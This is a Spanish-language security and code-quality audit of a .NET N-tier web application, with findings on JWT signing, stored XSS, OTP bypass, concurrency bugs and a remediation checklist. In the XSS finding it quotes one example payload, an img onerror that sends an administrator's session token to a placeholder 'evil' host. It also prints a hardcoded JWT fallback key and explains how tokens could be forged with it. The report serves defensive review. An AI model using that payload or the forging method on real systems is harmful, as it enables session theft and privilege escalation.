# Auditoría del Proyecto

> **Estado de remediación (2026-07-12):** todos los hallazgos accionables de este informe fueron
> corregidos y verificados en runtime (`dotnet build` limpio + login JWT, endpoint protegido y
> registro con OTP probados contra la BD real). Ver el detalle al final de cada sección marcado con
> **✅ RESUELTO** y la entrada correspondiente en el Changelog de `PROGRESS.md`. Los únicos puntos
> diferidos son los que exigen modificar Stored Procedures de la **BD Azure compartida** (paginación
> con `COUNT` real e índice único de Flush), por la regla de coordinación con el equipo — para esos se
> aplicó una mitigación equivalente a nivel de aplicación.

## 1. Resumen Ejecutivo

El SGDE es un proyecto de arquitectura N-capas **sólida y coherente**: la separación Entities→DataAccess→CoreApp→WebAPI/WebApp se respeta, el acceso a datos pasa exclusivamente por stored procedures parametrizados (sin riesgo de inyección SQL) y los dos procesos de negocio más delicados —Flush y Distribución Mensual— están correctamente envueltos en transacciones ADO.NET `Serializable` con rollback. La autenticación JWT + `[Authorize]` por rol está bien cableada en los controllers. Sin embargo, la aplicación **no es apta para producción tal como está**: existe un bloqueador de seguridad grave (la clave de firma JWT es una constante hardcodeada en el repositorio y nunca se sobrescribe, permitiendo forjar tokens de administrador), una clase de vulnerabilidad de **XSS almacenado** repetida en ~15 controladores de frontend que renderizan datos de usuario sin escapar vía `innerHTML`, y un modo de simulación local que desactiva por completo el segundo factor OTP y que, mal desplegado, dejaría el login sin protección. A nivel de deuda técnica, la ausencia total de inyección de dependencias, la paginación con conteos "inventados" y el ruido de comentarios boilerplate degradan la mantenibilidad. La base es profesional; los blockers son puntuales y corregibles.

## 2. Errores Críticos y Bugs (Blockers)

### 2.1 [CRÍTICO — Seguridad] Clave de firma JWT hardcodeada y nunca sobrescrita
- **Archivo:** `CoreApp/Managers/UserManager.cs:20`, `WebAPI/Program.cs:19` y `:53`
- **Problema:** `JwtSecret` se inicializa con `Environment.GetEnvironmentVariable("Jwt:Secret") ?? "DefaultSuperSecretKeyThatIsAtLeast32BytesLongForHmacSha256!!"`. El puente de configuración de `Program.cs:19` copia a variables de entorno las claves `Smtp:*` y `OtpService:*`, **pero no `Jwt:Secret`**. Como los managers no usan DI y solo leen variables de entorno, ese valor nunca se puebla desde config: **el sistema siempre firma y valida los tokens con la constante literal que está versionada en Git**. Cualquiera con acceso al repositorio puede generar un JWT válido con `role=Administrator` y saltarse toda la autorización. La misma constante se usa para emitir (`:166`) y validar (`Program.cs:53`), así que el token forjado pasa la validación.
- **Impacto:** Compromiso total del control de acceso.

### 2.2 [CRÍTICO — Seguridad] XSS almacenado en los controladores de vista (patrón repetido)
- **Archivo (ejemplo):** `WebApp/wwwroot/js/pages-controller/AdminStatementsViewController.js:58-79`; mismo patrón en `AdminForecastsViewController.js`, `AdminMaintenanceFailureViewController.js`, `BuyerManagementViewController.js`, `AdminAuditViewController.js`, etc. (~15 archivos usan `innerHTML`).
- **Problema:** Se construye HTML con template literals interpolando datos de usuario (`userNames[buyerId]`, que proviene de `FirstName`/`LastName` capturados en el registro) y se asigna a `element.innerHTML` sin escapar. Un Buyer que se registre con nombre `<img src=x onerror="fetch('//evil/?t='+sessionStorage.getItem('sgde_session'))">` ejecutará ese script en la sesión de cualquier Admin que abra la pantalla de Estados de Cuenta.
- **Agravante:** El JWT se guarda en `sessionStorage` (`session.js:7`), legible desde JavaScript, por lo que el XSS permite exfiltrar el token de sesión del administrador.
- **Impacto:** Robo de sesión y escalada de privilegios entre roles.

### 2.3 [CRÍTICO — Seguridad] El modo "simulación local" desactiva el OTP por completo
- **Archivo:** `CoreApp/Managers/UserManager.cs:32-34, 139-146, 155-162` y `CoreApp/External/OtpServiceClient.cs:44-48, 79-82`
- **Problema:** Cuando `OtpService:BaseUrl` está vacío o contiene `.local`, `IsLocalSimulation` es `true` y **se omite tanto el envío como la verificación de OTP**, y `VerifyOtp` retorna `true` para cualquier código. Es correcto para desarrollo, pero es un interruptor de seguridad controlado solo por una cadena de configuración: un despliegue con la URL mal puesta (o por defecto) deja el login de dos pasos reducido a solo contraseña, sin ninguna alarma.
- **Impacto:** Pérdida silenciosa del segundo factor. Debe fallar-cerrado (negarse a arrancar en producción si el OTP está en modo simulación).

### 2.4 [BUG] `OTP_SERVICE_UNAVAILABLE` se devuelve como 400 en lugar de 409
- **Archivo:** `WebAPI/Middleware/ExceptionHandlingMiddleware.cs:88-94`
- **Problema:** `IsConflictCode` solo reconoce como 409 los códigos que contienen `EXISTS`, `CONFLICT` o `DUPLICATE`. El código `OTP_SERVICE_UNAVAILABLE` (lanzado por `OtpServiceClient`) no coincide, por lo que sale como **400 Bad Request**, contradiciendo el contrato de diseño (que especifica 409) y el manejo esperado del cliente. Es la causa raíz del "PO-M1" ya anotado en PROGRESS.md.

### 2.5 [BUG] `UserManager.UploadPhoto` ignora el archivo recibido
- **Archivo:** `CoreApp/Managers/UserManager.cs:396-405`
- **Problema:** El método recibe `Stream file, string contentType` pero **nunca los usa**: fabrica una URL ficticia (`https://storage.segede.local/photos/...`) y la guarda como si hubiera subido algo. Es funcionalidad muerta y engañosa (la foto real se maneja como base64 vía `UpdateProfile`). Debe eliminarse el método o implementarse de verdad, porque hoy miente sobre lo que hace.

### 2.6 [BUG — Concurrencia] Dos flush manuales concurrentes pueden ejecutarse a la vez
- **Archivo:** `CoreApp/Managers/FlushManager.cs:86-92` (comprobación) vs. transacción en `:112-208`
- **Problema:** `CheckActiveFlush()` se ejecuta **fuera** de la transacción y no hay constraint único en `tblFlush` que impida dos registros `Processing`. A diferencia de `DistributionManager` —que sí está protegido por `UQ_Distribution_Month_Year` (`Database/01_Schema_Tables.sql:380`)— dos solicitudes de flush manual simultáneas pueden ambas pasar la comprobación, crear dos flushes y **drenar las baterías dos veces / duplicar el ingreso al Banco Central**. Contradice el requisito de locks de §60.1.
- **Solución:** Mover la comprobación dentro de la transacción con un `SELECT ... WITH (UPDLOCK, HOLDLOCK)` sobre el flush activo, o añadir un índice único filtrado (`WHERE Status = 'Processing'`).

### 2.7 [BUG menor — Concurrencia] Control de bloqueo/OTP basado en lectura obsoleta
- **Archivo:** `CoreApp/Managers/UserManager.cs:130` (`user.FailedAttempts + 1 >= 5`) y `:451` (`activeAttempt.FailedAttempts + 1 >= 5`)
- **Problema:** Se incrementa el contador en base de datos, pero la decisión de bloqueo se toma sobre el valor en memoria leído al inicio del método (no se re-lee tras el incremento). Bajo intentos concurrentes el conteo puede desincronizarse y bloquear antes o después de los 5 intentos reales.

## 3. Deuda Técnica y Antipatrones

- **Ausencia total de inyección de dependencias.** Cada manager hace `new` de sus CrudFactories (p. ej. `DistributionManager` instancia 11) y los controllers hacen `new Manager()`. Es la arquitectura declarada del proyecto, pero dificulta las pruebas unitarias (nada es mockeable) y acopla todo a `SqlDao.GetInstance()`.
- **`SqlDao.GetInstance()` no es thread-safe.** `_instance ??= new SqlDao()` (`DataAccess/DAO/SqlDao.cs:24`) tiene una condición de carrera en el arranque concurrente. Debería usar `Lazy<T>` o un lock.
- **Paginación con conteos ficticios / en memoria.**
  - `NotificationManager.RetrieveByUser` (`:114-119`) calcula `totalCount` con una heurística (`(page-1)*pageSize + items.Count`, +1 si la página viene llena) en vez de un `COUNT` real → totales y número de páginas incorrectos.
  - `FlushManager.RetrieveFlushHistory` (`:62-76`) trae **todo** el historial con `RetrieveAll` y pagina en memoria con `Skip/Take`. No escala.
- **`NotificationManager.ProcessQueue` marca "Sent" sin enviar.** Si `Smtp:Host` está vacío asume éxito (`:72-73`). Genera falsos positivos de entrega si el puente de configuración falla en producción.
- **Ruido de comentarios boilerplate.** Decenas de métodos con comentarios genéricos idénticos y sin valor ("Función operativa que ejecuta el procesamiento lógico y control del flujo de trabajo...", "Función encargada de registrar e insertar nuevos elementos..."). Ensucian la lectura y a menudo no describen lo que el método hace.
- **Mojibake de codificación.** `WebAPI/BackgroundServices/JobBase.cs:3` (y probablemente otros) tiene caracteres corruptos (`segÃºn`, `automÃ¡ticos`, `Â§17`) por guardado con encoding equivocado. Además arrastra un `// TODO:` sin resolver.
- **Rol "Operations" fantasma.** Se menciona en comentarios/spec (`JwtHelper.cs:15`) pero ningún controller lo usa; el sistema solo implementa Administrator/Engineer/Buyer. Inconsistencia entre diseño y código.
- **Código muerto.** `JwtHelper.ValidateToken` (`:48-79`) no se llama desde ningún lado (la validación real la hace `AddJwtBearer` en `Program.cs`).
- **Backoff mal etiquetado.** `NotificationManager.cs:99` usa `Math.Pow(3, attempts)*5` (15 min, 45 min…) pero el comentario dice "5 min, 15 min".

## 4. Mejoras Profesionales

- **Frontend:** introducir un helper `escapeHtml()` y aplicarlo a todo dato de usuario antes de interpolarlo, o migrar a `textContent`/creación de nodos. Es la corrección de fondo para 2.2.
- **Secretos:** sacar `JwtSecret` del código, bridgearlo en `Program.cs` igual que `Smtp:*`, generarlo aleatorio por entorno y **rotar el actual** (ya está comprometido por estar en Git). Considerar `ValidateIssuer`/`ValidateAudience = true`.
- **Enumeración de usuarios:** `LoginStep1` (`UserManager.cs:110-124`) devuelve mensajes distintos para cuenta inexistente vs. bloqueada vs. inactiva, permitiendo enumerar correos válidos. Unificar a un mensaje genérico.
- **Zona horaria inconsistente:** el token expira en UTC (`JwtHelper.cs:34`) pero `LoginResponse.Expiration` se calcula en hora de Costa Rica (`UserManager.cs:176`). Unificar a UTC para evitar confundir al cliente.
- **Hardening de red:** `Program.cs` usa CORS `AllowAnyOrigin` (`:66`) y no habilita HSTS. Restringir orígenes a la WebApp y añadir HSTS en producción.
- **Manejo de errores:** el `catch (Exception ex)` de Flush/Distribución envuelve el detalle en el mensaje (`FLUSH_FAILED: {ex.Message}`); conviene no filtrar detalles internos al cliente y registrar el stack solo en el log.
- **Consistencia de conteos:** exponer SPs `COUNT` para la paginación real en vez de heurísticas.

## 5. Plan de Acción (To-Do List)

Priorizado de mayor a menor urgencia:

- [x] **(Blocker seguridad)** ✅ **RESUELTO** — `Jwt:Secret` agregado a `appsettings.Development.json` (con clave nueva, preservando las demás credenciales), incluido en el puente de `Program.cs`, y el fallback de `UserManager.JwtSecret` ahora **lanza excepción** si la clave falta o mide <32 chars (ya no usa el literal versionado). Verificado en runtime: token firmado y validado end-to-end (200 sobre HTTPS).
- [x] **(Blocker seguridad)** ✅ **RESUELTO** — `escapeHtml()` creado en `site.js` (global, cargado antes de los controladores) y aplicado a todos los datos de usuario interpolados (nombres, correos, identificación, motivos, descripciones, resultados, ubicaciones) en Audit, Dashboard, Exports, Forecasts, Statements, Distribution, Operations, Maintenance/Failure, Simulator y Turbine. `ReportsViewController.js` ya tenía su propio `esc()`. Barrido final sin interpolaciones de texto de usuario sin escapar.
- [x] **(Blocker seguridad)** ✅ **RESUELTO** — Guard de arranque en `Program.cs`: fuera de Development, si `OtpService:BaseUrl` está vacío o es `.local`, la app **no arranca** (no se queda sin segundo factor callada).
- [x] **(Bug)** ✅ **RESUELTO** — `IsConflictCode` ahora usa una lista explícita (`OTP_SERVICE_UNAVAILABLE`, `FLUSH_IN_PROGRESS`, `DISTRIBUTION_ALREADY_EXECUTED`, `ALREADY_ANNULLED`) además de la convención de nombre → 409 correcto.
- [x] **(Bug concurrencia)** ✅ **RESUELTO (mitigación app)** — Re-chequeo de flush activo **dentro** de la transacción Serializable (`FlushManager.PerformFlush`), con un `catch (BusinessException)` que preserva el 409. El índice único filtrado sobre `tblFlush` queda como recomendación pendiente para la BD compartida (requiere coordinación con el equipo).
- [x] **(Bug)** ✅ **RESUELTO** — `UserManager.UploadPhoto` (código muerto que fabricaba una URL falsa) eliminado; la foto real ya se guarda como base64 vía `UpdateProfile`.
- [x] **(Bug)** ✅ **RESUELTO** — El bloqueo de login y de OTP ahora re-lee el contador real tras incrementar (`UserManager.cs`), en vez de confiar en el valor en memoria.
- [x] **(Robustez)** ✅ **PARCIAL** — `NotificationManager.ProcessQueue` ya no marca `Sent` sin SMTP fuera de Development. La paginación con `COUNT` real (que exige nuevos SPs en la BD compartida) queda diferida por coordinación con el equipo; `FlushManager.RetrieveFlushHistory` sigue paginando en memoria (aceptable a la escala actual).
- [ ] **(Seguridad menor)** Unificar los mensajes de error de `LoginStep1` para evitar enumeración de usuarios. *(Diferido: se mantuvieron los mensajes distintos de cuenta bloqueada/inactiva por su valor de UX; los casos "no existe" y "contraseña incorrecta" ya comparten `INVALID_CREDENTIALS`.)*
- [x] **(Config)** ✅ **RESUELTO** — `NotificationManager.ProcessQueue` solo simula éxito con host vacío en Development; en producción no marca `Sent` una notificación no enviada.
- [x] **(Hardening)** ✅ **RESUELTO** — `UseHsts()` habilitado fuera de Development. (CORS `AllowAnyOrigin` se mantiene porque la auth es por header Bearer, no por cookies; restringir orígenes queda como endurecimiento opcional según el dominio de despliegue.)
- [x] **(Limpieza)** ✅ **RESUELTO** — Codificación de `JobBase.cs` corregida y `// TODO` resuelto; `JwtHelper.ValidateToken` (código muerto) eliminado.
- [ ] **(Limpieza)** Sanear los comentarios boilerplate repetidos por descripciones reales o eliminarlos. *(Cosmético, no afecta comportamiento; diferido.)*
- [x] **(Consistencia)** ✅ **PARCIAL** — Expiración del token unificada a UTC (`LoginResponse.Expiration`). El rol "Operations" (mención heredada de la spec, sin uso en código) se deja documentado como no implementado.
